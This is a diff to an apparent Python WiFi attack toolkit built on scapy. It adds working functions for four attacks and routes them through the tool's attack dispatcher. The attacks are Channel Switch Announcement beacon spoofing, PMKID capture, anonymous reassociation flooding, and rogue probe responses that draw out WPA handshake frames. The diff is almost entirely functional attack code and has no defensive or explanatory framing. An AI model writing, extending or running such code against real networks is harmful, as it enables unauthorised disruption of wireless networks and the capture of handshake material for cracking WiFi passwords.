@@ -63,6 +63,75 @@ DEFAULT_ATTACK_INTERVAL = 5  # seconds between attacks
 DEFAULT_ATTACK_COUNT = 10    # number of frames per attack
 SUPPORTED_RATES = [0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24]  # 802.11 supported rates
 
+# --- Advanced WiFi Attacks (CSA, PMKID, Anon Reassoc, Rogue M2) ---
+def perform_csa_attack(interface, ap_mac, bssid, new_channel=6, count=5):
+    """Perform Channel Switch Announcement (CSA) attack by sending beacon frames with CSA IE."""
+    try:
+        from scapy.all import Dot11Elt
+        for c in range(count, 0, -1):
+            # Build CSA Information Element
+            csa_ie = Dot11Elt(ID=0x25, info=bytes([0, new_channel, c]))
+            beacon = RadioTap() / Dot11(
+                type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=ap_mac, addr3=bssid
+            ) / Dot11Beacon(cap="ESS+privacy") / csa_ie / Dot11Elt(ID="SSID", info="CSA_ATTACK") / Dot11Elt(ID="Rates", info=bytes(SUPPORTED_RATES))
+            sendp(beacon, iface=interface, verbose=0)
+        log_attack_activity("csa", ap_mac, bssid, "success", f"CSA beacons sent on channel {new_channel}")
+        return True
+    except Exception as e:
+        log_attack_activity("csa", ap_mac, bssid, "failed", str(e))
+        return False
+
+def perform_pmkid_attack(interface, ap_mac, client_mac=None, ssid="", count=1):
+    """Perform PMKID (M1) retrieval attack by sending authentication and association requests."""
+    try:
+        for _ in range(count):
+            # Authentication frame
+            auth = build_authentication_frame(ap_mac, client_mac or ap_mac, ap_mac)
+            sendp(auth, iface=interface, verbose=0)
+            # Association request
+            asso = build_association_request(ap_mac, client_mac or ap_mac, ssid)
+            sendp(asso, iface=interface, verbose=0)
+        log_attack_activity("pmkid", ap_mac, client_mac or ap_mac, "success", "PMKID frames sent")
+        return True
+    except Exception as e:
+        log_attack_activity("pmkid", ap_mac, client_mac or ap_mac, "failed", str(e))
+        return False
+
+def perform_anon_reassociation_attack(interface, ap_mac, ssid="", count=1):
+    """Send anonymous reassociation requests to AP with broadcast source address."""
+    try:
+        broadcast_mac = "ff:ff:ff:ff:ff:ff"
+        for _ in range(count):
+            frame = build_association_request(ap_mac, broadcast_mac, ssid)
+            sendp(frame, iface=interface, verbose=0)
+        log_attack_activity("anon_reassoc", ap_mac, broadcast_mac, "success", "Anonymous reassociation sent")
+        return True
+    except Exception as e:
+        log_attack_activity("anon_reassoc", ap_mac, broadcast_mac, "failed", str(e))
+        return False
+
+def perform_rogue_m2_attack(interface, station_mac, ap_mac, ssid="", directed=True, count=1):
+    """Send rogue probe responses to a station to elicit M2 (WPA handshake) frames."""
+    try:
+        from scapy.all import Dot11Elt
+        for _ in range(count):
+            if directed:
+                # Directed: probe response to station for a specific SSID
+                probe_resp = RadioTap() / Dot11(
+                    type=0, subtype=5, addr1=station_mac, addr2=ap_mac, addr3=ap_mac
+                ) / Dot11ProbeResp(cap="ESS+privacy") / Dot11Elt(ID="SSID", info=ssid) / Dot11Elt(ID="Rates", info=bytes(SUPPORTED_RATES))
+            else:
+                # Undirected: probe response to broadcast
+                probe_resp = RadioTap() / Dot11(
+                    type=0, subtype=5, addr1=station_mac, addr2=ap_mac, addr3=ap_mac
+                ) / Dot11ProbeResp(cap="ESS+privacy") / Dot11Elt(ID="SSID", info="") / Dot11Elt(ID="Rates", info=bytes(SUPPORTED_RATES))
+            sendp(probe_resp, iface=interface, verbose=0)
+        log_attack_activity("rogue_m2", station_mac, ap_mac, "success", f"Rogue M2 ({'directed' if directed else 'undirected'}) sent")
+        return True
+    except Exception as e:
+        log_attack_activity("rogue_m2", station_mac, ap_mac, "failed", str(e))
+        return False
+
 # --- ARP Discovery ---
 def get_arp_table():
     """Get all IP addresses from ARP table using 'arp -a' command"""
@@ -779,16 +848,22 @@ def run_association_attacks(interface, attack_types=None, target_mac=None, ap_ma
                 success = perform_disassoc_attack(interface, target_mac, ap_mac, count)
             elif attack_type == "assoc_flood" and ap_mac:
                 success = perform_association_flood(interface, ap_mac, ssid, count)
+            elif attack_type == "csa" and ap_mac:
+                success = perform_csa_attack(interface, ap_mac, ap_mac, count=count)
+            elif attack_type == "pmkid" and ap_mac:
+                success = perform_pmkid_attack(interface, ap_mac, target_mac, ssid, count)
+            elif attack_type == "anon_reassoc" and ap_mac:
+                success = perform_anon_reassociation_attack(interface, ap_mac, ssid, count)
+            elif attack_type == "rogue_m2_directed" and target_mac and ap_mac:
+                success = perform_rogue_m2_attack(interface, target_mac, ap_mac, ssid, directed=True, count=count)
+            elif attack_type == "rogue_m2_undirected" and target_mac and ap_mac:
+                success = perform_rogue_m2_attack(interface, target_mac, ap_mac, ssid, directed=False, count=count)
             else:
                 logging.warning(f"Skipping {attack_type}: missing required parameters")
                 continue
-                
             if success:
                 success_count += 1
-                
-            # Wait between attacks
             time.sleep(2)
-            
         except Exception as e:
             logging.error(f"Attack {attack_type} failed: {e}")
     
